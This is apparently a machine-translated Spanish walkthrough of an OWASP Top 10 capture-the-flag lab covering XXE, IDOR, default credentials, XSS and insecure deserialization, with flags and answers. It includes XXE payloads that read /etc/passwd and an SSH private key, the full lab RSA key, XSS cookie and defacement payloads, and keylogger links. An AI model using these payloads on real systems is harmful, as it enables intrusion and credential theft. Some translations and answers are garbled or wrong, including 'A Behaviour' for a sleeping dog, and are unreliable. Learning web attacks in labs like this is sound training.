Este desafío es de nuestro material exclusivo para suscriptores: ¡feliz piratería!

1. Implemente la máquina adjunta a la tarea.

## [](#day-4-xml-external-entity-extensible-markup-language)[Día 4] Entidad externa XML - Lenguaje de marcado extensible

Antes de pasar a aprender sobre la explotación de XXE, tendremos que entender XML correctamente.

**¿Qué es XML?**

XML (lenguaje de marcado extensible) es un lenguaje de marcado que define un conjunto de reglas para codificar documentos en un formato que es tanto legible por humanos como por máquinas. Es un lenguaje de marcado utilizado para almacenar y transportar datos.

**¿Por qué usamos XML?**

1. XML es independiente de la plataforma y del lenguaje de programación, por lo que se puede usar en cualquier sistema y es compatible con el cambio de tecnología cuando eso sucede.
2. Los datos almacenados y transportados usando XML se pueden cambiar en cualquier momento sin afectar la presentación de los datos.
3. XML permite la validación mediante DTD y Schema. Esta validación asegura que el documento XML esté libre de cualquier error de sintaxis.
4. XML simplifica el intercambio de datos entre varios sistemas debido a su naturaleza independiente de la plataforma. Los datos XML no requieren ninguna conversión cuando se transfieren entre diferentes sistemas.

**Sintaxis**

La mayoría de los documentos XML comienzan con lo que se conoce como XML Prolog.

```
<?xml version="1.0" encoding="UTF-8"?>
```

Encima de la línea se llama prólogo XML y especifica la versión XML y la codificación utilizada en el documento XML. Esta línea no es de uso obligatorio, pero se considera `good practice`que debe incluirse en todos sus documentos XML.

Cada documento XML debe contener un `ROOT`elemento. Por ejemplo:

```
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

En el ejemplo anterior, `<mail>`es el elemento ROOT de ese documento y `<to>`, `<from>`, `<subject>`, `<text>`son los elementos secundarios. Si el documento XML no tiene ningún elemento raíz, se consideraría `wrong`un `invalid`documento XML.

Otra cosa para recordar es que XML es un lenguaje que distingue entre mayúsculas y minúsculas. Si una etiqueta comienza como `<to>`entonces tiene que terminar por `</to>`y no por algo como `</To>`(observe las mayúsculas de `T`)

Al igual que HTML, también podemos usar atributos en XML. La sintaxis para tener atributos también es muy similar a HTML. Por ejemplo:

```
<text category="message">You need to learn about XXE</text>
```

En el ejemplo anterior `category`es el atributo `name`y el mensaje es el valor del atributo.

1. Forma completa de XML

`eXtensible Markup Language`

2. ¿Es obligatorio tener un prólogo XML en los documentos XML?

> Encima de la línea se llama prólogo XML y especifica la versión XML y la codificación utilizada en el documento XML. Esta línea no es de uso obligatorio, pero se considera `good practice`que debe incluirse en todos sus documentos XML.

`no`

3. ¿Podemos validar documentos XML contra un esquema?

> XML permite la validación mediante DTD y Schema. Esta validación asegura que el documento XML esté libre de cualquier error de sintaxis.

`yes`

1. ¿Cómo podemos especificar la versión XML y la codificación en un documento XML?

> La mayoría de los documentos XML comienzan con lo que se conoce como XML Prolog.

```
<?xml version="1.0" encoding="UTF-8"?>
```

`XML Prolog`

## [](#day-4-xml-external-entity-dtd)[Día 4] Entidad externa XML - DTD

Antes de pasar a aprender sobre XXE, debemos comprender qué es DTD en XML.

DTD significa Definición de tipo de documento. Una DTD define la estructura y los elementos y atributos legales de un documento XML.

Tratemos de entender esto con la ayuda de un ejemplo. Digamos que tenemos un archivo llamado `note.dtd`con el siguiente contenido:

```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```

Ahora podemos usar esta DTD para validar la información de algún documento XML y asegurarnos de que el archivo XML cumpla con las reglas de esa DTD.

Ej: A continuación se proporciona un documento XML que utiliza`note.dtd`

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

Así que ahora entendamos cómo ese DTD valida el XML. `note.dtd`Esto es lo que significan todos esos términos usados

- !DOCTYPE nota - Define un elemento raíz del documento llamado nota
- !ELEMENT nota - Define que el elemento nota debe contener los elementos: "a, desde, encabezado, cuerpo"
- !ELEMENT to - Define el `to`elemento para que sea del tipo "#PCDATA"
- !ELEMENTO de - Define el `from`elemento para que sea del tipo "#PCDATA"
- Encabezado !ELEMENT: define el `heading`elemento para que sea del tipo "#PCDATA"
- !ELEMENT body - Define que el `body`elemento sea del tipo "#PCDATA"

NOTA: #PCDATA significa datos de caracteres analizables.

1. ¿Cómo se define un nuevo ELEMENTO?

`!ELEMENT`

2. ¿Cómo se define un elemento ROOT?

`!DOCTYPE`

3. ¿Cómo se define una nueva ENTIDAD?

`!ENTITY`

## [](#day-4-xml-external-entity-xxe-payload)[Día 4] Entidad externa XML - Carga útil XXE

Ahora veremos algo de carga útil XXE y veremos cómo funcionan.

1. El primer payload que veremos es muy simple. Si ha leído correctamente la tarea anterior, comprenderá esta carga muy fácilmente.

```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
    <userInfo>
        <firstName>falcon</firstName>
        <lastName>&name;</lastName>
    </userInfo>
```

Como podemos ver estamos definiendo un `ENTITY`llamado `name`y asignándole un valor `feast`. Más tarde estamos usando esa ENTIDAD en nuestro código.

1. También podemos usar XXE para leer algún archivo del sistema definiendo una ENTIDAD y haciendo que use la palabra clave SYSTEM

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Aquí nuevamente, estamos definiendo una ENTIDAD con el nombre `read`, pero la diferencia es que estamos configurando el valor `SYSTEM`y la ruta del archivo.

Si usamos esta carga útil, un sitio web vulnerable a XXE (normalmente) mostraría el contenido del archivo `/etc/passwd`.

De manera similar, podemos usar este tipo de carga útil para leer otros archivos, pero muchas veces puede fallar al leer los archivos de esta manera o el motivo de la falla podría ser el archivo que está tratando de leer.

1. Pruebe la carga útil mencionada en la descripción en el sitio web.

## [](#day-4-xml-external-entity-exploiting)[Día 4] Entidad externa XML: explotación

Ahora veamos algunas cargas útiles en acción. La carga útil que usaré es la que vimos en la tarea anterior.

1. Veamos cómo se vería el sitio web si intentáramos usar la carga útil para mostrar el nombre.

[![](https://user-content.gitlab-static.net/07c31b91af43e3be6499a3497bc324e7a172ca8a/68747470733a2f2f692e696d6775722e636f6d2f4f4858587869342e706e67)](https://user-content.gitlab-static.net/07c31b91af43e3be6499a3497bc324e7a172ca8a/68747470733a2f2f692e696d6775722e636f6d2f4f4858587869342e706e67)

En el lado izquierdo, podemos ver la solicitud de eructo que se envió con la carga útil codificada en la URL y en el lado derecho podemos ver que la carga útil pudo mostrar correctamente el nombre`falcon feast`

2. Ahora tratemos de leer el`/etc/passwd`

[![](https://user-content.gitlab-static.net/d7d3ad4773de6374bec60b30b807b29bcab7997c/68747470733a2f2f692e696d6775722e636f6d2f30393247534c7a2e706e67)](https://user-content.gitlab-static.net/d7d3ad4773de6374bec60b30b807b29bcab7997c/68747470733a2f2f692e696d6775722e636f6d2f30393247534c7a2e706e67)

1. Intenta mostrar tu propio nombre usando cualquier carga útil.

`No answer needed`

2. Vea si puede leer el /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```

`No answer needed`

3. ¿Cuál es el nombre del usuario en /etc/passwd?

```
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```

`falcon`

4. ¿Dónde se encuentra la clave SSH de falcon?

`/home/falcon/.ssh/id_rsa`

5. ¿Cuáles son los primeros 18 caracteres de la clave privada de Falcon?

```
<!DOCTYPE any [<!ENTITY passwd SYSTEM 'file///home/falcon/.ssh/id_rsa'>]>

<any>
  <pass>&passwd;</pass>
</any>
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC
lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB
2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN
MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ
IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO
HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD
RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5
bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh
NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y
OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea
TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X
Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya
6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb
j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA
MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn
qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg
faKF5VknsONM9DC3ZNx5L1zQXbsIrWbEPsRlytECgYB7CXr/IZwLfeqUfu7yoq3R
sJKtbhYf+S4hhTPcOCQd13e8n10/HZg0CzXpZbGieusQ3lIml9Ouusp8ML0Y3aIe
f9pmP+UKnEdqUMMLg/RhowHRlD9qm0F4lf1CbQh/NK01I5ore6SPUM7fqWv4UWDr
wZzIfad/RbWxQooYtYXvUQKBgFDLcBIdpYX1x16aX1AfqLMWgRSrQqNj9UXmQa0g
83OvXmGdkbQoUfjjz1I/i10x00cycxjqpfn9htIIptG7J6i92SnTj0Vl9eTOQ1qz
N9y5qVhcURHrVh0+vy3LzNACv73y5gDw2L7PJoo0GYODn8j4eAFZJpg3qlQpovTw
HtOxAoGABqwywFKFNTYgrl17Rs4g3H1nc0EhOzGetRaRL2bcvQsZevuWyswp0Mbm
9nlgNAtxttsmfL+OU7nP3I4YQlyZed4luRWcRaXrvGMqfEL4wzRez5ZxMnZM/IlQ
9DBlD9C7t5MI3aXR3A5zFVVINomwHH7aGfeha1JRXXAtasLTVvA=
-----END RSA PRIVATE KEY-----
```

`MIIEogIBAAKCAQEA7b`

## [](#day-5-broken-access-control)[Día 5] Control de acceso roto

[![](https://user-content.gitlab-static.net/f5c09269a79fd0be89dd9fbbb9894c9540a0b72f/68747470733a2f2f692e696d6775722e636f6d2f664e6c444654522e706e67)](https://user-content.gitlab-static.net/f5c09269a79fd0be89dd9fbbb9894c9540a0b72f/68747470733a2f2f692e696d6775722e636f6d2f664e6c444654522e706e67)

Los sitios web tienen páginas que están protegidas de los visitantes regulares, por ejemplo, solo el usuario administrador del sitio debe poder acceder a una página para administrar a otros usuarios. Si un visitante del sitio web puede acceder a la página o páginas protegidas que no está autorizado a ver, los controles de acceso se rompen.

Un visitante habitual que puede acceder a páginas protegidas puede dar lugar a lo siguiente:

- Ser capaz de ver información sensible
- Acceso a funciones no autorizadas

OWASP tiene una lista de algunos escenarios de ataque que demuestran las debilidades del control de acceso:

**Escenario n.º 1:** la aplicación utiliza datos no verificados en una llamada SQL que accede a la información de la cuenta:

```
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
```

Un atacante simplemente modifica el parámetro 'acct' en el navegador para enviar cualquier número de cuenta que desee. Si no se verifica correctamente, el atacante puede acceder a la cuenta de cualquier usuario.

`http://example.com/app/accountInfo?acct=notmyacct`

**Escenario n.º 2:** un atacante simplemente fuerza las búsquedas a las URL de destino. Se requieren derechos de administrador para acceder a la página de administración.

`http://example.com/app/getappInfo`

`http://example.com/app/admin_getappInfo`

Si un usuario no autenticado puede acceder a cualquiera de las páginas, es una falla. Si alguien que no es administrador puede acceder a la página de administración, esto es una falla ( [referencia a escenarios](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control) ).

En pocas palabras, el control de acceso roto permite a los atacantes eludir la autorización, lo que les permite ver datos confidenciales o realizar tareas como si fueran un usuario privilegiado.

1. Lea y comprenda cómo funciona el control de acceso roto.

## [](#day-5-broken-access-control-idor-challenge)[Día 5] Control de acceso roto (Desafío IDOR)

[![](https://user-content.gitlab-static.net/d8d08a6817e53b717ffd4de871d8bf0abab7953b/68747470733a2f2f692e696d6775722e636f6d2f763747754533642e706e67)](https://user-content.gitlab-static.net/d8d08a6817e53b717ffd4de871d8bf0abab7953b/68747470733a2f2f692e696d6775722e636f6d2f763747754533642e706e67)

IDOR, o Referencia de objeto directo inseguro, es el acto de explotar una configuración incorrecta en la forma en que se maneja la entrada del usuario, para acceder a recursos a los que normalmente no podría acceder. IDOR es un tipo de vulnerabilidad de control de acceso.

Por ejemplo, supongamos que iniciamos sesión en nuestra cuenta bancaria y, después de autenticarnos correctamente, nos llevan a una URL como esta `https://example.com/bank?account_number=1234`. En esa página podemos ver todos nuestros datos bancarios importantes, y un usuario haría lo que tuviera que hacer y seguiría su camino pensando que no pasa nada.

Sin embargo, existe un problema potencialmente enorme aquí, un pirata informático puede cambiar el parámetro número_cuenta a algo más como 1235, y si el sitio está configurado incorrectamente, entonces tendría acceso a la información bancaria de otra persona.

1. Lea y comprenda cómo funciona IDOR.

`No answer needed`

2. Implemente la máquina y vaya a [http://MACHINE_IP](http://MACHINE_IP) : inicie sesión con el nombre de usuario `noot`y la contraseña `test1234`.

`No answer needed`

1. Mira las notas de otros usuarios. ¿Qué es la bandera?

- [http://10.10.238.227/nota.php?nota=0](http://10.10.238.227/note.php?note=0)

`flag{fivefourthree}`

## [](#day-6-security-misconfiguration)[Día 6] Error de configuración de seguridad

**Configuración incorrecta de seguridad**

Las configuraciones erróneas de seguridad son distintas de las otras 10 principales vulnerabilidades, porque ocurren cuando la seguridad podría haberse configurado correctamente, pero no lo fue.

Las configuraciones incorrectas de seguridad incluyen:

- Permisos mal configurados en servicios en la nube, como cubos S3
- Tener habilitadas funciones innecesarias, como servicios, páginas, cuentas o privilegios
- Cuentas predeterminadas con contraseñas sin cambios
- Mensajes de error que son demasiado detallados y permiten que un atacante obtenga más información sobre el sistema
- No usar [encabezados de seguridad HTTP](https://owasp.org/www-project-secure-headers/) o revelar demasiados detalles en el servidor: encabezado HTTP

Esta vulnerabilidad a menudo puede generar más vulnerabilidades, como credenciales predeterminadas que le dan acceso a datos confidenciales, XXE o inyección de comandos en las páginas de administración.

Para obtener más información, recomiendo echar un vistazo a las [10 principales entradas de OWASP para Configuración incorrecta de seguridad](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)

**Contraseñas predeterminadas**

Específicamente, esta VM se enfoca en las contraseñas predeterminadas. Estos son un ejemplo específico de una mala configuración de seguridad. Podría y debería cambiar las contraseñas predeterminadas, pero la gente a menudo no lo hace.

Es particularmente común en dispositivos integrados y de Internet de las cosas, y la mayor parte del tiempo los propietarios no cambian estas contraseñas.

Es fácil imaginar el riesgo de las credenciales predeterminadas desde el punto de vista de un atacante. Ser capaz de obtener acceso a paneles de administración, servicios diseñados para administradores de sistemas o fabricantes, o incluso infraestructura de red, podría ser increíblemente útil para atacar una empresa. Desde la exposición de datos hasta RCE sencillo, los efectos de las credenciales predeterminadas pueden ser graves.

En octubre de 2016, Dyn (un proveedor de DNS) se desconectó debido a uno de los ataques DDoS más memorables de los últimos 10 años. La avalancha de tráfico provino principalmente de Internet de las cosas y dispositivos de red como enrutadores y módems, infectados por el malware Mirai.

¿Cómo se apoderó el malware de los sistemas? Contraseñas predeterminadas. El malware tenía una lista de 63 pares de nombre de usuario/contraseña e intentó iniciar sesión en los servicios de telnet expuestos.

El ataque DDoS fue notable porque desconectó muchos sitios web y servicios grandes. Amazon, Twitter, Netflix, GitHub, Xbox Live, PlayStation Network y muchos más servicios se desconectaron durante varias horas en 3 oleadas de ataques DDoS en Dyn.

**Ejemplo práctico**

Esta máquina virtual muestra un `Security Misconfiguration`, como parte de la lista de las 10 principales vulnerabilidades de OWASP.

¡Implemente la VM y piratee explotando la configuración incorrecta de seguridad!

1. Implementar la máquina virtual

`No answer needed`

2. ¡Hackea la aplicación web y encuentra la bandera!

[![](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_21-16.png)](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_21-16.png)

- [Usando Notas Pensativas](https://github.com/NinjaJc01/PensiveNotes#using-pensivenotes)

`pensive:PensiveNotes`

[![](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_21-17.png)](/dhiksec/tryhackme/-/raw/master/OWASP%20Top%2010/2020-09-26_21-17.png)

`thm{4b9513968fd564a87b28aa1f9d672e17}`

## [](#day-7-cross-site-scripting)[Día 7] Secuencias de comandos entre sitios

**XSS explicado**

Las secuencias de comandos entre sitios, también conocidas como XSS, son una vulnerabilidad de seguridad que normalmente se encuentra en las aplicaciones web. Es un tipo de inyección que puede permitir que un atacante ejecute scripts maliciosos y haga que se ejecuten en la máquina de la víctima.

Una aplicación web es vulnerable a XSS si utiliza una entrada de usuario no desinfectada. XSS es posible en Javascript, VBScript, Flash y CSS. Hay tres tipos principales de secuencias de comandos entre sitios:

1. **XSS almacenado** : el tipo de XSS más peligroso. Aquí es donde se origina una cadena maliciosa de la base de datos del sitio web. Esto sucede a menudo cuando un sitio web permite la entrada del usuario que no se desinfecta (elimina las "partes malas" de la entrada de un usuario) cuando se inserta en la base de datos.
2. **XSS reflejado** : la carga útil maliciosa es parte de la solicitud de las víctimas al sitio web. El sitio web incluye esta carga útil en respuesta al usuario. En resumen, un atacante necesita engañar a una víctima para que haga clic en una URL para ejecutar su carga maliciosa.
3. **XSS basado en DOM** : DOM significa Document Object Model y es una interfaz de programación para documentos HTML y XML. Representa la página para que los programas puedan cambiar la estructura, el estilo y el contenido del documento. Una página web es un documento y este documento se puede mostrar en la ventana del navegador o como fuente HTML.

Para obtener más explicaciones y ejercicios de XSS, consulte la [sala de XSS](https://tryhackme.com/room/xss) .

**Cargas útiles XSS**

Recuerde, las secuencias de comandos entre sitios son una vulnerabilidad que puede explotarse para ejecutar Javascript malicioso en la máquina de la víctima. Echa un vistazo a algunos tipos de cargas útiles comunes que se utilizan:

- Popup's ( `<script>alert(“Hello World”)</script>`): crea un mensaje emergente de Hello World en el navegador de un usuario.
- Escritura de HTML (document.write): anule el HTML del sitio web para agregar el suyo propio (esencialmente, desfigurando toda la página).
- [Registrador de teclas XSS](http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) : puede registrar todas las pulsaciones de teclas de un usuario, capturando su contraseña y otra información confidencial que escriben en la página web.
- [Escaneo de puertos](http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) : un miniescáner de puertos local (más información al respecto en la sala TryHackMe XSS).

[XSS-Payloads.com](http://www.xss-payloads.com/) es un sitio web que tiene cargas útiles, herramientas, documentación y más relacionadas con XSS. Puede descargar cargas útiles XSS que toman instantáneas de una cámara web o incluso obtener un puerto y un escáner de red más capaces.

**Desafío XSS**

La máquina virtual adjunta a esta tarea muestra XSS basado en DOM, reflejado y almacenado. ¡Despliega la máquina y explota cada tipo!

1. Implementar la máquina virtual

`No answer needed`

2. Vaya a [http://MACHINE_IP/reflejada](http://MACHINE_IP/reflected) y elabore una carga útil XSS reflejada que generará una ventana emergente que diga "Hola".

`<script>alert("Hello")</script>`

`ThereIsMoreToXSSThanYouThink`

3. En la misma página reflexiva, elabore una carga útil XSS reflejada que generará una ventana emergente con la dirección IP de su máquina.

`<script>alert(window.location.hostname)</script>`

`ReflectiveXss4TheWin`

4. Ahora navegue a [http://MACHINE_IP/stored](http://MACHINE_IP/stored) y cree una cuenta. Luego agregue un comentario y vea si puede insertar algo de su propio HTML.

`<b>Hello World!</b>`

`HTML_T4gs`

5. En la misma página, cree un cuadro emergente de alerta que aparecerá en la página con las cookies de su documento.

`<script>alert(document.cookie)</script>`

`W3LL_D0N3_LVL2`

6. Cambie "XSS Playground" a "Soy un hacker" agregando un comentario y usando Javascript.

`<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`

`websites_can_be_easily_defaced_with_xss`

## [](#day-8-insecure-deserialization)[Día 8] Deserialización insegura

**.:. OWASP10 - A8: Deserialización insegura .:.**

[![](https://user-content.gitlab-static.net/f75a9fc04012fc13f1348c777860c21933e330dd/68747470733a2f2f692e696d6775722e636f6d2f52654c327245652e706e67)](https://user-content.gitlab-static.net/f75a9fc04012fc13f1348c777860c21933e330dd/68747470733a2f2f692e696d6775722e636f6d2f52654c327245652e706e67)

_"La deserialización insegura es una vulnerabilidad que ocurre cuando se utilizan datos que no son de confianza para abusar de la lógica de una aplicación" (Acunetix., 2017)_

Esta definición es todavía bastante amplia por decir lo menos. Simplemente, la deserialización insegura está reemplazando los datos procesados ​​por una aplicación con código malicioso; permitiendo cualquier cosa, desde DoS (Denegación de servicio) hasta RCE (Ejecución remota de código) que el atacante puede usar para hacerse un hueco en un escenario de pentesting.

Específicamente, este código malicioso aprovecha el proceso legítimo de serialización y deserialización que utilizan las aplicaciones web. Explicaremos este proceso y por qué es tan común en las aplicaciones web modernas.

OWASP clasifica esta vulnerabilidad como 8 de 10 por las siguientes razones:

- Baja explotabilidad. Esta vulnerabilidad suele ser caso por caso: no existe una herramienta/marco confiable para ella. Debido a su naturaleza, los atacantes deben tener una buena comprensión del funcionamiento interno del ToE.
- El exploit es tan peligroso como lo permita la habilidad del atacante, más aún, el valor de los datos que están expuestos. Por ejemplo, alguien que solo puede causar un DoS hará que la aplicación no esté disponible. El impacto comercial de esto variará en la infraestructura: algunas organizaciones se recuperarán bien, otras, sin embargo, no.

**.:. ¿Qué es Vulnerable? .:.**

En resumen, en última instancia, cualquier aplicación que almacene o obtenga datos donde no haya validaciones o verificaciones de integridad para los datos consultados o retenidos. Algunos ejemplos de aplicaciones de esta naturaleza son:

- Sitios de comercio electrónico
- Foros
- API
- Tiempos de ejecución de aplicaciones (Tomcat, Jenkins, Jboss, etc.)

1. ¿Quién desarrolló la aplicación Tomcat?

`The Apache Software Foundation`

2. ¿Qué tipo de ataque que bloquea los servicios se puede realizar con una deserialización insegura?

`Denial of Service`

## [](#day-8-insecure-deserialization-objects)[Día 8] Deserialización insegura - Objetos

**.:. Objetos .:.**

Un elemento destacado de la programación orientada a objetos (OOP), los objetos se componen de dos cosas:

- Estado
- Comportamiento

Simplemente, los objetos le permiten crear líneas de código similares sin tener que hacer el trabajo preliminar de escribir todas las líneas de código.

Por ejemplo, una lámpara sería un buen objeto. Las lámparas pueden tener diferentes tipos de bombillas, este sería su estado, además de estar encendidas o apagadas, ¡su comportamiento!

En lugar de tener que acomodar cada tipo de bombilla y si esa lámpara específica está encendida o apagada, puede usar métodos para simplemente alterar el estado y el comportamiento de la lámpara.

1. Selecciona el término correcto de la siguiente afirmación: si un perro estuviera durmiendo, sería: A) Un Estado B) Un Comportamiento

`A Behaviour`

## [](#day-8-insecure-deserialization-deserialization)[Día 8] Deserialización insegura - Deserialización

**.:. Des(Serialización) .:.**

_El aprendizaje se hace mejor a través de analogías._

Un turista se te acerca por la calle y te pide indicaciones. Están buscando un punto de referencia local y se perdieron. Desgraciadamente, el inglés no es su punto fuerte y tampoco hablas su dialecto. ¿A qué te dedicas? Dibujas un mapa de la ruta hacia el punto de referencia porque las imágenes cruzan las barreras del idioma, pudieron encontrar el punto de referencia. ¡Lindo! Acaba de serializar cierta información, donde el turista luego la deserializa para encontrar el punto de referencia.

**.:. Continúa... .:.**

La serialización es el proceso de convertir objetos utilizados en la programación en un formato más simple y compatible para transmitir entre sistemas o redes para su posterior procesamiento o almacenamiento.

Alternativamente, la deserialización es lo contrario de esto; convertir información serializada en su forma compleja, un objeto que la aplicación comprenderá.

**.:. ¿Qué quiere decir esto? .:.**

Digamos que tiene una contraseña de "contraseña123" de un programa que debe almacenarse en una base de datos en otro sistema. Para viajar a través de una red, esta cadena/salida debe convertirse a binario. Por supuesto, la contraseña debe almacenarse como "contraseña123" y no como su notación binaria. Una vez que esto llega a la base de datos, se convierte o se deserializa nuevamente en "password123" para que pueda almacenarse.

El proceso se explica mejor a través de diagramas:

[![](https://user-content.gitlab-static.net/06533ed902d6ac79f396cdb31e7e5521dc8e5b64/68747470733a2f2f692e696d6775722e636f6d2f5a4237366d4c492e706e67)](https://user-content.gitlab-static.net/06533ed902d6ac79f396cdb31e7e5521dc8e5b64/68747470733a2f2f692e696d6775722e636f6d2f5a4237366d4c492e706e67)

**.:. ¿Cómo podemos aprovechar esto? .:.**

Simplemente, la deserialización insegura ocurre cuando se ejecutan datos de una parte que no es de confianza (es decir, un pirata informático) porque no hay filtrado ni validación de entrada; el sistema asume que los datos son confiables y los ejecutará sin restricciones.

1. ¿Cuál es el nombre del formato base-2 con el que se envían los datos a través de una red?

`Binary`

## [](#day-8-insecure-deserialization-cookies)[Día 8] Deserialización insegura - Cookies

**.:. Galletas 101 .:.**

[![](https://user-content.gitlab-static.net/3e91536d05422263a9bf1950b9e7a8ac733d8779/68747470733a2f2f692e696d6775722e636f6d2f71386c525949372e706e67)](https://user-content.gitlab-static.net/3e91536d05422263a9bf1950b9e7a8ac733d8779/68747470733a2f2f692e696d6775722e636f6d2f71386c525949372e706e67)

Ah sí, el origen de muchos memes. Las cookies son una herramienta esencial para el funcionamiento de los sitios web modernos. Pequeñas piezas de datos, estos son creados por un sitio web y almacenados en la computadora del usuario.

[![](https://user-content.gitlab-static.net/01b3fb3633cb3d3b5a5147a317ddd46bc009fbcf/68747470733a2f2f692e696d6775722e636f6d2f706867353145492e706e67)](https://user-content.gitlab-static.net/01b3fb3633cb3d3b5a5147a317ddd46bc009fbcf/68747470733a2f2f692e696d6775722e636f6d2f706867353145492e706e67)

Verá notificaciones como las anteriores en la mayoría de los sitios web en estos días. Los sitios web utilizan estas cookies para almacenar comportamientos específicos del usuario, como artículos en su carrito de compras o ID de sesión.

En la aplicación web que vamos a explotar, notará que las cookies almacenan información de inicio de sesión como la siguiente. ¡Ay!

[![](https://user-content.gitlab-static.net/a2cbdb327fd16248ca95003cd7d2128d22f39114/68747470733a2f2f692e696d6775722e636f6d2f51685237614f582e706e67)](https://user-content.gitlab-static.net/a2cbdb327fd16248ca95003cd7d2128d22f39114/68747470733a2f2f692e696d6775722e636f6d2f51685237614f582e706e67)

Si bien las credenciales de texto sin formato son una vulnerabilidad en sí mismas, no es una deserialización insegura ya que no hemos enviado ningún dato serializado para su ejecución.

Las cookies no son soluciones de almacenamiento permanentes como las bases de datos. Algunas cookies, como las ID de sesión, se borrarán cuando se cierre el navegador; otras, sin embargo, durarán considerablemente más. Esto está determinado por el temporizador de "caducidad" que se establece cuando se crea la cookie.

Algunas cookies tienen atributos adicionales, una pequeña lista de estos se encuentra a continuación:

|Atributo|Descripción|¿Requerido?|
|---|---|---|
|Nombre de la galleta|El Nombre de la Cookie a configurar|Sí|
|Valor de la cookie|Valor, esto puede ser cualquier texto sin formato o codificado|Sí|
|Solo seguro|Si se establece, esta cookie solo se establecerá a través de conexiones HTTPS|No|
|Expiración|Establezca una marca de tiempo en la que se eliminará la cookie del navegador|No|
|Camino|La cookie solo se enviará si la URL especificada está dentro de la solicitud|No|

**.:. Creando Cookies .:.**

